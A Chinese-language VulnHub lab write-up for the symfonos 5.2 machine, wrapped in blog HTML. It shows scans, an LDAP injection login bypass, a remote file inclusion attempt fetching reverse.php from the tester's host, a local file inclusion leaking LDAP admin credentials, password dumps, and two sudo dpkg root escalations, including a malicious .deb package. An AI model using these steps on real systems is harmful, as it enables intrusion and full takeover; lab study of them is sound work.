@@ -1,0 +1,377 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 6.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.1/css/all.min.css" integrity="sha256-Z1K5uhUaJXA7Ll0XrZ/0JhX4lAtZFpT6jkKrEDT0drU=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"rerestst.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.14.2","exturl":false,"sidebar":{"position":"left","display":"always","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="本文内容纯属虚构！ 靶机IP地址：192.168.31.197 测试机IP地址：192.168.31.38">
+<meta property="og:type" content="article">
+<meta property="og:title" content="symfonos 5.2_VulnHub靶机攻略">
+<meta property="og:url" content="https://rerestst.github.io/2022/11/22/symfonos%205.2_VulnHub%E9%9D%B6%E6%9C%BA%E6%94%BB%E7%95%A5/index.html">
+<meta property="og:site_name" content="rerestst&#39;s blog">
+<meta property="og:description" content="本文内容纯属虚构！ 靶机IP地址：192.168.31.197 测试机IP地址：192.168.31.38">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2022-11-22T13:29:49.000Z">
+<meta property="article:modified_time" content="2024-01-09T04:27:56.407Z">
+<meta property="article:author" content="rerestst">
+<meta property="article:tag" content="VulnHub">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="https://rerestst.github.io/2022/11/22/symfonos%205.2_VulnHub%E9%9D%B6%E6%9C%BA%E6%94%BB%E7%95%A5/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://rerestst.github.io/2022/11/22/symfonos%205.2_VulnHub%E9%9D%B6%E6%9C%BA%E6%94%BB%E7%95%A5/","path":"2022/11/22/symfonos 5.2_VulnHub靶机攻略/","title":"symfonos 5.2_VulnHub靶机攻略"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>symfonos 5.2_VulnHub靶机攻略 | rerestst's blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">rerestst's blog</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="Search" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories<span class="badge">4</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives<span class="badge">14</span></a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A4%96%E9%83%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">1.</span> <span class="nav-text">外部信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="nav-number">1.0.1.</span> <span class="nav-text">端口扫描</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#LDAP%E5%8C%BF%E5%90%8D%E7%99%BB%E5%BD%95"><span class="nav-number">1.0.2.</span> <span class="nav-text">LDAP匿名登录</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E7%BD%91%E7%AB%99%E7%9B%AE%E5%BD%95%E6%9E%9A%E4%B8%BE"><span class="nav-number">1.0.3.</span> <span class="nav-text">网站目录枚举</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%8F%91%E7%8E%B0%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95%E7%82%B9"><span class="nav-number">1.0.4.</span> <span class="nav-text">发现漏洞测试点</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#1-%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E5%8F%91%E7%8E%B0"><span class="nav-number">1.0.4.1.</span> <span class="nav-text">(1)敏感信息发现</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#2-LDAP%E6%B3%A8%E5%85%A5"><span class="nav-number">1.0.4.2.</span> <span class="nav-text">(2)LDAP注入</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B5%8B%E8%AF%95%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E"><span class="nav-number">2.</span> <span class="nav-text">测试文件包含漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%B0%9D%E8%AF%95RFI"><span class="nav-number">2.0.1.</span> <span class="nav-text">尝试RFI</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%B0%9D%E8%AF%95LFI"><span class="nav-number">2.0.2.</span> <span class="nav-text">尝试LFI</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%AE%BF%E9%97%AELDAP"><span class="nav-number">3.</span> <span class="nav-text">访问LDAP</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E9%80%9A%E8%BF%87jxplorer"><span class="nav-number">3.0.1.</span> <span class="nav-text">通过jxplorer</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E9%80%9A%E8%BF%87ldapsearch"><span class="nav-number">3.0.2.</span> <span class="nav-text">通过ldapsearch</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#sudo%E6%8F%90%E6%9D%83"><span class="nav-number">4.</span> <span class="nav-text">sudo提权</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%96%B9%E6%B3%951"><span class="nav-number">4.0.1.</span> <span class="nav-text">方法1</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%96%B9%E6%B3%952"><span class="nav-number">4.0.2.</span> <span class="nav-text">方法2</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%85%B6%E4%BB%96"><span class="nav-number">5.</span> <span class="nav-text">其他</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#flag"><span class="nav-number">5.0.1.</span> <span class="nav-text">flag</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E9%9D%B6%E6%9C%BA%E9%97%AE%E9%A2%98"><span class="nav-number">5.0.2.</span> <span class="nav-text">靶机问题</span></a></li></ol></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="rerestst"
+      src="/images/avatar.gif">
+  <p class="site-author-name" itemprop="name">rerestst</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">14</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">8</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://rerestst.github.io/2022/11/22/symfonos%205.2_VulnHub%E9%9D%B6%E6%9C%BA%E6%94%BB%E7%95%A5/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="rerestst">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="rerestst's blog">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="symfonos 5.2_VulnHub靶机攻略 | rerestst's blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          symfonos 5.2_VulnHub靶机攻略
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2022-11-22 21:29:49" itemprop="dateCreated datePublished" datetime="2022-11-22T21:29:49+08:00">2022-11-22</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2024-01-09 12:27:56" itemprop="dateModified" datetime="2024-01-09T12:27:56+08:00">2024-01-09</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E9%9D%B6%E6%9C%BA%E6%94%BB%E7%95%A5/" itemprop="url" rel="index"><span itemprop="name">靶机攻略</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <p>本文内容纯属虚构！</p>
+<p>靶机IP地址：192.168.31.197</p>
+<p>测试机IP地址：192.168.31.38</p>
+<span id="more"></span>
+
+<h3 id="外部信息收集"><a href="#外部信息收集" class="headerlink" title="外部信息收集"></a>外部信息收集</h3><p>访问<a target="_blank" rel="noopener" href="http://192.168.31.234/">http://192.168.31.197/</a>只有一个图片。</p>
+<h5 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">PORT    STATE SERVICE  REASON         VERSION</span><br><span class="line">22/tcp  open  ssh      syn-ack ttl 64 OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)</span><br><span class="line">80/tcp  open  http     syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: HEAD GET POST OPTIONS</span><br><span class="line">|_http-server-header: Apache/2.4.29 (Ubuntu)</span><br><span class="line">389/tcp open  ldap     syn-ack ttl 63 OpenLDAP 2.2.X - 2.3.X</span><br><span class="line">636/tcp open  ldapssl? syn-ack ttl 63</span><br><span class="line">LDAP Results</span><br><span class="line">|   &lt;ROOT&gt;</span><br><span class="line">|       namingContexts: dc=symfonos,dc=local</span><br><span class="line">|       supportedControl: 2.16.840.1.113730.3.4.18</span><br><span class="line">...</span><br><span class="line">|       supportedSASLMechanisms: GSSAPI</span><br><span class="line">|       supportedSASLMechanisms: DIGEST-MD5</span><br><span class="line">|       supportedSASLMechanisms: OTP</span><br><span class="line">|       supportedSASLMechanisms: NTLM</span><br><span class="line">|       supportedSASLMechanisms: CRAM-MD5</span><br><span class="line">|_      subschemaSubentry: cn=Subschema</span><br></pre></td></tr></table></figure>
+
+<h5 id="LDAP匿名登录"><a href="#LDAP匿名登录" class="headerlink" title="LDAP匿名登录"></a>LDAP匿名登录</h5><p>$ ldapdomaindump 192.168.31.197</p>
+<p>失败</p>
+<h5 id="网站目录枚举"><a href="#网站目录枚举" class="headerlink" title="网站目录枚举"></a>网站目录枚举</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.31.197/FUZZ -e .php,.txt -c</span><br><span class="line">.php                    [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 2ms]</span><br><span class="line">home.php                [Status: 302, Size: 979, Words: 117, Lines: 29, Duration: 2ms]</span><br><span class="line">admin.php               [Status: 200, Size: 1650, Words: 707, Lines: 40, Duration: 1ms]</span><br><span class="line">static                  [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 0ms]</span><br><span class="line">logout.php              [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 0ms]</span><br><span class="line">portraits.php           [Status: 200, Size: 165, Words: 10, Lines: 4, Duration: 13ms]</span><br><span class="line">server-status           [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 0ms]</span><br></pre></td></tr></table></figure>
+
+
+
+<p>访问<a target="_blank" rel="noopener" href="http://192.168.31.197/admin.php%E4%B8%BA%E7%99%BB%E5%BD%95%E7%95%8C%E9%9D%A2">http://192.168.31.197/admin.php为登录界面</a></p>
+<p>尝试SQLi</p>
+<p>GET &#x2F;admin.php?username&#x3D;admin%27or%271&amp;password&#x3D;asfd</p>
+<p>未成功</p>
+<h5 id="发现漏洞测试点"><a href="#发现漏洞测试点" class="headerlink" title="发现漏洞测试点"></a>发现漏洞测试点</h5><h6 id="1-敏感信息发现"><a href="#1-敏感信息发现" class="headerlink" title="(1)敏感信息发现"></a>(1)敏感信息发现</h6><p>GET &#x2F;home.php</p>
+<p>返回包：</p>
+<p>HTTP&#x2F;1.1 302 Found</p>
+<p>data中看到<a target="_blank" rel="noopener" href="http://127.0.0.1/home.php?url=http://127.0.0.1/portraits.php">http://127.0.0.1/home.php?url=http://127.0.0.1/portraits.php</a></p>
+<h6 id="2-LDAP注入"><a href="#2-LDAP注入" class="headerlink" title="(2)LDAP注入"></a>(2)LDAP注入</h6><p>想到存在LDAP服务，尝试LDAP注入。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GET /admin.php?username=*&amp;password=*</span><br><span class="line">登录成功</span><br><span class="line">发现存在页面http://127.0.0.1/home.php?url=http://127.0.0.1/portraits.php</span><br><span class="line">修改URL为http://192.168.31.197/home.php?url=http://127.0.0.1/portraits.php</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="测试文件包含漏洞"><a href="#测试文件包含漏洞" class="headerlink" title="测试文件包含漏洞"></a>测试文件包含漏洞</h3><h5 id="尝试RFI"><a href="#尝试RFI" class="headerlink" title="尝试RFI"></a>尝试RFI</h5><p><a target="_blank" rel="noopener" href="http://192.168.31.197/home.php?url=http://192.168.31.38:8088/reverse.php">http://192.168.31.197/home.php?url=http://192.168.31.38:8088/reverse.php</a></p>
+<p>发现PHP文件未解析</p>
+<p>GET &#x2F;home.php?url&#x3D;<a target="_blank" rel="noopener" href="http://127.0.0.1/admin.php">http://127.0.0.1/admin.php</a></p>
+<p>显示了页面内容，但无PHP</p>
+<h5 id="尝试LFI"><a href="#尝试LFI" class="headerlink" title="尝试LFI"></a>尝试LFI</h5><p>GET &#x2F;home.php?url&#x3D;admin.php</p>
+<p>返回包中：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ldap_ch = ldap_connect(&quot;ldap://172.18.0.22&quot;);</span><br><span class="line">$bind = ldap_bind($ldap_ch, &quot;cn=admin,dc=symfonos,dc=local&quot;, &quot;qMDdyZh3cT6eeAWD&quot;);</span><br><span class="line">$filter = &quot;(&amp;(uid=$username)(userPassword=$password))&quot;;</span><br><span class="line">$result = ldap_search($ldap_ch, &quot;dc=symfonos,dc=local&quot;, $filter);</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="访问LDAP"><a href="#访问LDAP" class="headerlink" title="访问LDAP"></a>访问LDAP</h3><h5 id="通过jxplorer"><a href="#通过jxplorer" class="headerlink" title="通过jxplorer"></a>通过jxplorer</h5><p>DN：cn&#x3D;admin,dc&#x3D;symfonos,dc&#x3D;local</p>
+<p>密码：qMDdyZh3cT6eeAWD</p>
+<h5 id="通过ldapsearch"><a href="#通过ldapsearch" class="headerlink" title="通过ldapsearch"></a>通过ldapsearch</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">$ ldapsearch -x -H ldap://192.168.31.197 -D &#x27;cn=admin,dc=symfonos,dc=local&#x27; -w qMDdyZh3cT6eeAWD -b &#x27;dc=symfonos,dc=local&#x27;</span><br><span class="line"># symfonos.local</span><br><span class="line">dn: dc=symfonos,dc=local</span><br><span class="line">objectClass: top</span><br><span class="line">objectClass: dcObject</span><br><span class="line">objectClass: organization</span><br><span class="line">o: symfonos</span><br><span class="line">dc: symfonos</span><br><span class="line"></span><br><span class="line"># admin, symfonos.local</span><br><span class="line">dn: cn=admin,dc=symfonos,dc=local</span><br><span class="line">objectClass: simpleSecurityObject</span><br><span class="line">objectClass: organizationalRole</span><br><span class="line">cn: admin</span><br><span class="line">description: LDAP administrator</span><br><span class="line">userPassword:: e1NTSEF9VVdZeHZ1aEEwYldzamZyMmJodHhRYmFwcjllU2dLVm0=</span><br><span class="line"></span><br><span class="line"># zeus, symfonos.local</span><br><span class="line">dn: uid=zeus,dc=symfonos,dc=local</span><br><span class="line">uid: zeus</span><br><span class="line">cn: zeus</span><br><span class="line">sn: 3</span><br><span class="line">objectClass: top</span><br><span class="line">objectClass: posixAccount</span><br><span class="line">objectClass: inetOrgPerson</span><br><span class="line">loginShell: /bin/bash</span><br><span class="line">homeDirectory: /home/zeus</span><br><span class="line">uidNumber: 14583102</span><br><span class="line">gidNumber: 14564100</span><br><span class="line">userPassword:: Y2V0a0tmNHdDdUhDOUZFVA==</span><br><span class="line">mail: zeus@symfonos.local</span><br><span class="line">gecos: Zeus User</span><br></pre></td></tr></table></figure>
+
+
+
+<p>登录后得到：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">cn admin</span><br><span class="line">userPassword:</span><br><span class="line">&#123;SSHA&#125;UWYxvuhA0bWsjfr2bhtxQbapr9eSgKVm</span><br><span class="line"></span><br><span class="line">cn:zeus</span><br><span class="line">gecos:Zeus User</span><br><span class="line">gidNumber:14564100</span><br><span class="line">homeDirectory:/home/zeus</span><br><span class="line">loginShell:/bin/bash</span><br><span class="line">mail:zeus@symfonos.local</span><br><span class="line">objectClass:</span><br><span class="line">top</span><br><span class="line">posixAccount</span><br><span class="line">inetOrgPerson</span><br><span class="line">sn:3</span><br><span class="line">uid:zeus</span><br><span class="line">uidNumber:14583102</span><br><span class="line">userPassword:cetkKf4wCuHC9FET</span><br></pre></td></tr></table></figure>
+
+
+
+<p>通过用户名口令尝试连接SSH</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ssh zeus@192.168.31.197</span><br><span class="line">zeus@symfonos5:~$ id</span><br><span class="line">uid=1000(zeus) gid=1000(zeus) groups=1000(zeus),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="sudo提权"><a href="#sudo提权" class="headerlink" title="sudo提权"></a>sudo提权</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ sudo -l</span><br><span class="line">Matching Defaults entries for zeus on symfonos5:</span><br><span class="line">   env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span><br><span class="line"></span><br><span class="line">User zeus may run the following commands on symfonos5:</span><br><span class="line">   (root) NOPASSWD: /usr/bin/dpkg</span><br></pre></td></tr></table></figure>
+
+
+
+<h5 id="方法1"><a href="#方法1" class="headerlink" title="方法1"></a>方法1</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ sudo dpkg -l</span><br><span class="line">!/bin/sh</span><br><span class="line">ii  cpio              2.12+dfsg-9         amd64     GNU cpio -- a program to manage archives of files</span><br><span class="line">ii  cpp              4:8.3.0-1          amd64     GNU C preprocessor (cpp)</span><br><span class="line">ii  cpp-8             8.3.0-6           amd64     GNU C preprocessor</span><br><span class="line">ii  cron              3.0pl1-134+deb10u1      amd64     process scheduling daemon</span><br><span class="line">罗列时在底部输入：</span><br><span class="line">!/bin/sh</span><br><span class="line"># id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br></pre></td></tr></table></figure>
+
+
+
+<h5 id="方法2"><a href="#方法2" class="headerlink" title="方法2"></a>方法2</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">fpm需要rubygems等，Debian类系统安装:</span><br><span class="line">sudo apt-get install ruby ruby-dev rubygems build-essential</span><br><span class="line">sudo gem install --no-document fpm</span><br><span class="line">fpm --version</span><br><span class="line"></span><br><span class="line">touch exp.sh</span><br><span class="line">echo &#x27;exec /bin/sh&#x27; &gt; exp.sh</span><br><span class="line">fpm -n x -s dir -t deb -a all --before-install exp.sh .</span><br><span class="line">ls -al</span><br><span class="line">-rw-r--r--  1 kali kali 8341274 Feb 21 04:38 x_1.0_all.deb</span><br><span class="line">传到靶机</span><br><span class="line">$ sudo dpkg -i x_1.0_all.deb</span><br><span class="line">Selecting previously unselected package x.</span><br><span class="line">(Reading database ... 53057 files and directories currently installed.)</span><br><span class="line">Preparing to unpack x_1.0_all.deb ...</span><br><span class="line"># id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><h5 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># cat /root/proof.txt</span><br><span class="line">Congrats on rooting symfonos:5!</span><br></pre></td></tr></table></figure>
+
+
+
+<h5 id="靶机问题"><a href="#靶机问题" class="headerlink" title="靶机问题"></a>靶机问题</h5><p>fuzz LDAP和LFI时未成功，错误返回Wrong scheme! You can only use http or https!还十分逼真，以为是过滤了。重新导入虚拟机才可能好。</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/VulnHub/" rel="tag"># VulnHub</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2022/08/22/symfonos%204_VulnHub%E9%9D%B6%E6%9C%BA%E6%94%BB%E7%95%A5/" rel="prev" title="symfonos 4_VulnHub靶机攻略">
+                  <i class="fa fa-chevron-left"></i> symfonos 4_VulnHub靶机攻略
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2022/12/27/symfonos%206.1_VulnHub%E9%9D%B6%E6%9C%BA%E6%94%BB%E7%95%A5/" rel="next" title="symfonos 6.1_VulnHub靶机攻略">
+                  symfonos 6.1_VulnHub靶机攻略 <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2024</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">rerestst</span>
+</div>
+
+    </div>
+  </footer>
+
+  
+  <div class="back-to-top" role="button" aria-label="Back to top">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+
+
+  
+
+
+
+
+
